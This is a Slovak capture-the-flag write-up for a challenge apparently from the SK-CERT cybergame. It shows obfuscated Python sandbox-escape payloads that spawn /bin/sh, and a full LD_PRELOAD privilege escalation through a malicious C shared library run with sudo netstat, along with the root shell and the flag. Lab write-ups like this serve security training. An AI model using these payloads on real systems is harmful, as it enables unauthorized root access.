# Zadanie

EN: That is interesting functionality. We can see that a separate user was created to run the calculator, but maybe the root user has more secrets that can be uncovered.

SK: Je to zaujímavá funkcionalita. Vidíme, že bol vytvorený samostatný používateľ na spustenie kalkulačky, ale možno má používateľ root viac tajomstiev, ktoré môžu byť odhalené.

## Riešenie

Zo zadania je celkom jasné, že budeme potrebovať povýšiť privilégiá, pretože po zadaní príkazu `whoami` som dostal `calc` a napríklad pri `sudo ls /root` som dostal toto

```
nc exp.cybergame.sk 7002
>> ().__class__.__base__.__subclasses__()[120]().load_module(().__class__.__base__.__subclasses__()[5]([111,115]).decode()).__dict__[().__class__.__base__.__subclasses__()[5]([115,121,115,116,101,109]).decode()](().__class__.__base__.__subclasses__()[5]([115,117,100,111,32,108,115,32,47,114,111,111,116]).decode())
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
```

trochu ma otravuje obfuskovať python kód a skúsim, či mi povolí `/bin/sh` a povolilo.

Môžeme zadávať príkazy bez nutnosti obfuskovania po tom ako zadáme 

```
().__class__.__base__.__subclasses__()[120]().load_module(().__class__.__base__.__subclasses__()[5]([111,115]).decode()).__dict__[().__class__.__base__.__subclasses__()[5]([115,121,115,116,101,109]).decode()](().__class__.__base__.__subclasses__()[5]([47, 98, 105, 110, 47, 115, 104]).decode())
```

Pozrieme sudoers, či neexistujú nejké príkazy, na ktoré nemusíme zadávať heslo, `sudo -l` nám vráti

```
sudo -l
Matching Defaults entries for calc on e458e1c65a08:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty, env_keep+=LD_PRELOAD

User calc may run the following commands on e458e1c65a08:
    (ALL) NOPASSWD: /bin/netstat
```

Bingo... Okrem toho, že vieme pustiť netstat bez zadania hesla roota, máme tu aj `env_keep+=LD_PRELOAD`, čo nám otvára možnosť vytvoriť si vlastnú knižnicu pokiaľ vieme skompilovať vlastný c kód a na mašine je gcc. Do /tmp si teda uložíme náš c kód a nazveme napríklad mylib.c a skompilujeme.

Zadáme tieto príkazy

```bash
cat > /tmp/mylib.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void runme(void)
{
    setuid(0);
    setgid(0);
    system("/bin/sh");
}
EOF
```

```bash
gcc -shared -fPIC -o /tmp/mylib.so /tmp/mylib.c -nostartfiles
```

```bash
sudo LD_PRELOAD=/tmp/mylib.so /bin/netstat
```

počkáme, dostaneme automaticky `sh 1: Cannot fork` ,to nevadí a keď zadáme `whoami` dostame znova tú hlášku, ale na ďalší pokus dostaneme `root`. Nazrieme do jeho priečinka, je tam flag.txt, zadáme ešte `cat flag.txt` a máme vlajku.

```
nc exp.cybergame.sk 7002
>> ().__class__.__base__.__subclasses__()[120]().load_module(().__class__.__base__.__subclasses__()[5]([111,115]).decode()).__dict__[().__class__.__base__.__subclasses__()[5]([115,121,115,116,101,109]).decode()](().__class__.__base__.__subclasses__()[5]([47, 98, 105, 110, 47, 115, 104]).decode())

cat > /tmp/mylib.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void runme(void)
{
    setuid(0);
    setgid(0);
    system("/bin/sh");
}
EOF

gcc -shared -fPIC -o /tmp/mylib.so /tmp/mylib.c -nostartfiles

sudo LD_PRELOAD=/tmp/mylib.so /bin/netstat
sh: 1: Cannot fork

whoami
/bin/sh: 1: Cannot fork
sh: 1: Cannot fork

whoami
root

ls -la /root
total 24
drwx------ 1 root root 4096 Mar 31 20:01 .
drwxr-xr-x 1 root root 4096 Apr 10 14:47 ..
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
-rw-r--r-- 1 root root  254 May 14  2024 .wget-hsts
-rw-rw-r-- 1 root root   40 Mar 31 16:57 flag.txt

cat flag.txt
SK-CERT{35c3p1ng_py7h0n_15_345y_745k}
```

## Vlajka

```
SK-CERT{35c3p1ng_py7h0n_15_345y_745k}
```
